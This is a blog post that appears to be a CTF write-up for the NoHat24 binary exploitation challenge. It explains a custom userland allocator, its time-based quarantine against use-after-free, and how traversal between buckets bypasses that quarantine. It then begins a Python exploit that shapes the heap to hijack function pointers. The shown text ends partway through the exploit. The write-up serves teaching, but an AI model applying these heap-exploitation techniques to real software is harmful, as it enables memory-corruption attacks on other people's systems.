<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Introduction In the previous blog post we have covered a walkthrough guide to solve the Reverse Engineering challenge written for the NoHat24 security conference."><title>Exploiting a Quarantine UAF Mitigation on a Custom Allocator Challenge</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://1day.dev//icon.png><link href=https://1day.dev/styles.7153093e4d1bbb584a28469cadfa3f88.min.css rel=stylesheet><link href=https://1day.dev/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://1day.dev/js/darkmode.e6934a61ff52b65bd16cdf94b370f112.min.js></script>
<script src=https://1day.dev/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://1day.dev/js/popover.53ad9a087e3feeaaa12b63bfd02d923b.min.js></script>
<script src=https://1day.dev/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://1day.dev/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://1day.dev/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const BASE_URL="https://1day.dev/",fetchData=Promise.all([fetch("https://1day.dev/indices/linkIndex.c6ef9a74ba7ac78a73716adc2959770d.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://1day.dev/indices/contentIndex.49a098361c4a180460bcd89aab62ce42.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://1day.dev",!1,!0)},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'â€™':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/1day.dev\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-BZ6HJYMG3K"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-BZ6HJYMG3K",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://1day.dev/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://1day.dev/>ðŸ‘¾ @kiks</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Exploiting a Quarantine UAF Mitigation on a Custom Allocator Challenge</h1><p class=meta>Last updated
Apr 16, 2025</p><ul class=tags><li><a href=https://1day.dev/tags/Linux/>Linux</a></li><li><a href=https://1day.dev/tags/Exploitation/>Exploitation</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#introducing-the-custom-allocator>Introducing the Custom Allocator</a><ol><li><a href=#freelist-quarantine-mitigation>Freelist quarantine mitigation</a></li><li><a href=#freelist-quarantine-weakness>Freelist quarantine Weakness</a></li></ol></li><li><a href=#main-binary-logic>Main binary logic</a></li><li><a href=#the-vulnerability-uaf>The vulnerability (UAF)</a></li><li><a href=#exploitation>Exploitation</a><ol><li><a href=#objective>Objective</a></li><li><a href=#heap-shaping-to-bypass-the-quarantine>Heap shaping to bypass the quarantine</a></li><li><a href=#partial-overwrite>Partial Overwrite</a></li></ol></li><li><a href=#alternative-solution-double-free>Alternative Solution (Double Free)</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#appendix>Appendix</a><ol><li><a href=#exploit-code>Exploit Code</a></li><li><a href=#challenge-source-code>Challenge Source Code</a></li></ol></li></ol></nav></details></aside><a href=#introduction><h2 id=introduction><span class=hanchor arialabel=Anchor># </span>Introduction</h2></a><p>In the
<a href=https://1day.dev/notes/A-Reverse-Engineering-Journey-Walkthrough rel=noopener>previous blog post</a> we have covered a walkthrough guide to solve the Reverse Engineering challenge written for the
<a href=https://www.nohat.it/ rel=noopener>NoHat24</a> security conference. In this blog post, we are going to cover the binary exploitation challenge that involves a custom userland allocator that has been specifically developed for this challenge. Writing our own allocator, remotely inspired from the kernel SLUB allocator, was a really fun and educational experience. We have implemented an Use-After-Free quarantine mitigation to prevent its exploitation, was it good enough?</p><a href=#introducing-the-custom-allocator><h2 id=introducing-the-custom-allocator><span class=hanchor arialabel=Anchor># </span>Introducing the Custom Allocator</h2></a><p>The custom allocator source code was available through an HTTP web interface and can now be download directly from
<a href=https://github.com/hacktivesec/nohat24-blog-references/tree/main/pwn rel=noopener>here</a>.</p><p>The two files <code>hmalloc.h</code> and <code>hmalloc.c</code> contains the whole implementation of the custom allocator that replaces the standard glibc malloc. The following diagram and structs describes the allocator design:</p><p><img src=/notes/images/expl-ctf/allocator.svg width=auto></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>list_head</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span> <span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span> <span class=n>prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>bucket</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>list_head</span>  <span class=n>buckets</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* Offset of the available alloc inside the bucket */</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint16_t</span>  <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* How many allocs are freed */</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span>   <span class=n>freelist_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span>   <span class=n>freelist</span><span class=p>[</span><span class=n>MAX_ALLOCS</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span>     <span class=n>allocs</span><span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Single allocations just contain the size of the alloc as metadata */</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>alloc</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint16_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span>   <span class=n>user</span><span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>__attribute__</span><span class=p>((</span><span class=n>packed</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>The target allocator, inspired from the kernel SLUB allocator, has a simple &ldquo;bucket&rdquo; concept. Each allocation size (from 16 to 1024) has its own memory region retrieved from <code>mmap</code> (through <code>__init_bucket</code>) and it is considered a <code>SMALL_BUCKET</code>, while larger buckets (<code>LARGE_BUCKETS</code>) are not handled from the allocator. A Bucket Master Control (<code>bucket_master_ctrl</code> global variable inside <code>hmalloc.c</code>) is used to store buckets&rsquo; addresses using an offset that can be used to retrieve the requested bucket for the needed size. The size of the allocation is the offset minus the size of a pointer. For example, the bucket address for 32 bytes allocations is at offset 24 (32-8).</p><p>When <code>malloc</code> is called the first time with a specific size, that is always rounded to the nearest power of two starting from 32 (e.g. 32, 64, 128, 256, 512, 1024), the bucket is allocated through <code>__init_bucket</code> and referred to as the <code>current_bucket</code>. The current bucket is the bucket from where we try to initially allocate from. It can be retrieved, once allocated, using <code>__get_bucket</code>. Each allocation, named <code>alloc</code> inside the source code, contains just the size of the allocation as metadata and <code>alloc->user</code> is the returned <code>malloc</code> pointer. When an <code>alloc</code> is allocated from a <code>bucket</code>, the <code>bucket->offset</code> is incremented by one and used for the next allocations to return subsequent memory addresses (it is always multiplied with the allocation size). The offset does not just provides the capability to return new allocations but also marks and identifies freed allocations inside the bucket. A freelist is implemented to first return freed memory (to avoid fragmentation) with a LIFO mechanism. <code>bucket->freelist</code> is an array of freed <code>allocs</code> (based on their offsets) that can be accessed with the <code>bucket->freelist_count</code> that is incremented every time an <code>alloc</code> is freed and decremented when a freed allocation is returned back to the user. This &ldquo;dynamic&rdquo; array permits to handle the freelist pretty easily and is the first path to return an allocation from the <code>__malloc</code> logic.</p><p>When the maximum number of allocations (<code>(PAGE_SIZE - sizeof(struct bucket)) / alloc_size</code>) is reached for a bucket, a new bucket is created (through new <code>mmap</code> memory) and linked through the <code>list_head</code> <code>next</code> and <code>prev</code> members.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>old_current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>prev</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>old_current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>The linked list permits to have more buckets linked together for each allocation size. When the current bucket is full (e.g. it is not possible to re-allocate freed allocs neither new allocs) previous and next buckets are verified (traversing the linked list backwards and forwards) and an allocation is returned if one of them contains a freed alloc on its freelist. Also, if the found bucket contains more than a specific amount of freed elements (<code>FREELIST_REPLACE_BUCKET_THRESHOLD</code>) it is replaced as the current bucket from the <code>bucket_master_ctrl</code> (through <code>__update_master_ctrl_bucket</code>).</p><p>When <code>free</code> is called with a pointer, the <code>alloc</code> struct is retrieved through <code>ptr - sizeof(struct alloc)</code> and the bucket obtained masking the pointer with <code>0xfff</code> (memory returned from <code>mmap</code> is always page aligned). In order to calculate its offset inside the bucket, the allocation size retrieved from the metadata of the <code>alloc</code> is used as a dividend to the allocation address minus <code>bucket->allocs</code> (e.g. the first alloc is 0, the second 1, the third 2 and so on). The <code>bucket->freelist[]</code> array is updated with the calculated offset and <code>bucket->freelist_count</code> incremented by one.</p><a href=#freelist-quarantine-mitigation><h3 id=freelist-quarantine-mitigation><span class=hanchor arialabel=Anchor># </span>Freelist quarantine mitigation</h3></a><p>Before leaving the <code>free</code> function, a global <code>freelist_quarantine_time</code> variable is set with the current time. When verifying the freelist of the current bucket, the function <code>__is_freelist_available</code> verify its availability. It is possible to return a freed alloc <strong>only</strong> if ten seconds (<code>FREELIST_QUARANTINE_WAIT</code>) are passed from the last freed element:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>__is_freelist_available</span><span class=p>(){</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef FREELIST_QUARANTINE
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=k>if</span><span class=p>((</span><span class=n>time</span><span class=p>(</span><span class=nb>NULL</span><span class=p>)</span> <span class=o>-</span> <span class=n>freelist_quarantine_time</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>FREELIST_QUARANTINE_WAIT</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Freelist is quarantined</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>This mitigations is aimed to prevent the immediate re-use of freed allocations (Use-After-Free vulnerabilities).</p><a href=#freelist-quarantine-weakness><h3 id=freelist-quarantine-weakness><span class=hanchor arialabel=Anchor># </span>Freelist quarantine Weakness</h3></a><p>However, the mitigation is not bullet proof, and this is the intended objective of the CTF. The freelist timer is only checked while searching for freed allocs inside the same bucket, but not when traversing. Suppose the following scenario:</p><ul><li>Two buckets (<code>bucket_1</code> and <code>bucket_2</code>) are fully allocated (e.g. no available or freed allocations). <code>bucket_2</code> is the &ldquo;current&rdquo; one (the one registered in the Bucket Master Control).</li><li>An alloc is freed from <code>bucket_1</code>.</li><li>When <code>malloc</code> is called (with the same size of the two buckets) the freelist of <code>bucket_2</code> is not available while, with traversing, the just freed alloc from <code>bucket_1</code> is immediately available.</li></ul><p>The described scenario can be useful to exploit an immediate UaF condition.</p><a href=#main-binary-logic><h2 id=main-binary-logic><span class=hanchor arialabel=Anchor># </span>Main binary logic</h2></a><p>The main binary logic (<code>main.c</code>) is pretty simple. It reads from stdin <code>4096</code> bytes and parses it line by line, searching for commands to execute inside a <code>switch</code> statement. Each line must begin with a valid command (<code>CMD_CREATE</code>, <code>CMD_ADD</code>, <code>CMD_DELETE</code>, <code>CMD_SELL</code>, <code>CMD_DROP</code>) and follows a command specific format. For example, the <code>CMD_CREATE</code> command allocates a <code>struct object</code> (using <code>malloc</code>) where <code>malloc</code> is also used to allocate <code>object->name</code> and <code>object->description</code> using <code>strlen</code> with some size validation. At the end of the command, the three function pointers (<code>sell</code>, <code>add</code> and <code>drop</code>) are respectively set with <code>function_sell</code>, <code>function_add</code> and <code>function_drop</code>, just like a primitive OOP language.
This is the mentioned struct:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>object</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>price</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span><span class=o>*</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span><span class=o>*</span> <span class=n>description</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>stock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>earnings</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>sell</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>add</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>drop</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>Also, when a new <code>object</code> is allocated, an array of object pointers (<code>objs</code>) is updated to store all of them. The array is later used for the vtable functions (<code>sell</code>, <code>add</code> and <code>drop</code>) and to delete an object based on its specified id.</p><a href=#the-vulnerability-uaf><h2 id=the-vulnerability-uaf><span class=hanchor arialabel=Anchor># </span>The vulnerability (UAF)</h2></a><p>The vulnerability is pretty straightforward: when an object is freed (through <code>CMD_FREE</code>), the <code>objs</code> array is not updated and the dangling pointer can be still accessed without further validations from another command (Use-After-Free) or itself (Double Free).
However, there is just one big obstacle: the freelist quarantine mitigation does not permit an immediate Use-After-Free. In order to exploit the UAF, it is necessary to re-create an heap layout similar to the one described in &ldquo;Freelist quarantine Weakness&rdquo;, where we can trigger the UAF against an allocation from a non current bucket.</p><a href=#exploitation><h2 id=exploitation><span class=hanchor arialabel=Anchor># </span>Exploitation</h2></a><a href=#objective><h3 id=objective><span class=hanchor arialabel=Anchor># </span>Objective</h3></a><p>Let&rsquo;s first declare an objective. As simple as it sounds, we want to compromise the binary application (that is exposed through <code>socat</code>) and read the flag. We have a UAF primitive on a <code>struct object</code> that contains interesting members: dynamic strings (that we can use to overlap the freed allocation) and three function pointers. Function pointers, that behave like a vtable, seems like a really juicy target since they are allocated in the heap (inside the object structure) and can be triggered from multiple commands. Name and description members are really interesting allocations that can be used to replace the freed alloc due to their flexible size based on user input.</p><p>Also, since we have a single interaction with the program (we pass everything through stdin once) we cannot use read primitives or similar to leak ASLR. We can go for a bruteforce or a partial overwrite in order to don&rsquo;t mess too much with randomized pointers.</p><a href=#heap-shaping-to-bypass-the-quarantine><h3 id=heap-shaping-to-bypass-the-quarantine><span class=hanchor arialabel=Anchor># </span>Heap shaping to bypass the quarantine</h3></a><p>With a clearer path in mind, let&rsquo;s start to create the UAF state with python step by step:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>objs</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Objective:</span>
</span></span><span class=line><span class=cl><span class=c1># Allocate 2 64 bytes buckets and make them full</span>
</span></span><span class=line><span class=cl><span class=c1># 520 = sizeof(struct bucket)</span>
</span></span><span class=line><span class=cl><span class=c1># 4096 - 520 = 3576 / 64 = 55</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>n</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>55</span> <span class=o>*</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>obj_id</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;h&#34;</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>n</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=n>objs</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>obj_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=c1># print_stderr(&#34;[*] Creating object {}&#34;.format(n))</span>
</span></span><span class=line><span class=cl>	<span class=c1># Create</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x10</span><span class=s2>&#34;</span> <span class=c1># CMD_CREATE</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span> <span class=o>+=</span> <span class=n>obj_id</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x16\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x41</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>20</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x42</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>We fulfill two buckets (<code>bucket_1</code> and <code>bucket_2</code>) with 110 allocations of <code>struct object</code>. The size of <code>struct object</code> is <code>58</code>, hence it goes into the bucket of 64 bytes allocations (we can call it <code>bucket_64</code>). The <code>bucket_64</code> can contains up to 55 allocations since the <code>PAGE_SIZE</code> memory region (4096) minus the size of the <code>struct bucket</code> metadata (520) and divided by its size (64), it&rsquo;s 55.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># DELETE (Free)</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x12</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>+=</span> <span class=n>objs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># DELETE (Free)</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x12</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>+=</span> <span class=n>objs</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
